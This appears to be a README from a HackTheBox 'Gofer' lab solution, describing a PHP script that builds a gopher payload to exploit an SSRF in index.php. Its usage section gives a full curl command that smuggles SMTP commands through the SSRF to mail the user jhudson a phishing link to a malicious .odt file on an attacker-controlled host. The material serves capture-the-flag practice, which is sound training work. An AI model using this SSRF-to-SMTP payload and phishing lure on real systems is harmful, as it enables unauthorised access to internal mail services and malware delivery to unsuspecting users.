## About:
* **Platform**&nbsp;&nbsp;&nbsp;: HackTheBox
* **Challenge**&nbsp;: Gofer
* **Difficulty**&nbsp;&nbsp;: Hard
* **Link**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: [https://app.hackthebox.com/machines/554](https://app.hackthebox.com/machines/554)

## Description:
This PHP script is designed to create a `gopher` payload, enabling the exploitation of the SSRF vulnerability found in `/index.php?url=ssrf-here`. It works by sending a phishing email to `jhudson`, containing a link to a malicious `.odt` file.

## Usage:
```bash
php gopher-generator.php
curl -X POST http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL+FROM%3A+%3Croot%40gofer.htb%3E%250ARCPT+TO%3A+%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A+Important+mail%250AClick+on+this+link%3A+http%3A%2F%2F10.10.10.10%2Fphish.odt+for+more+info%250A.
```
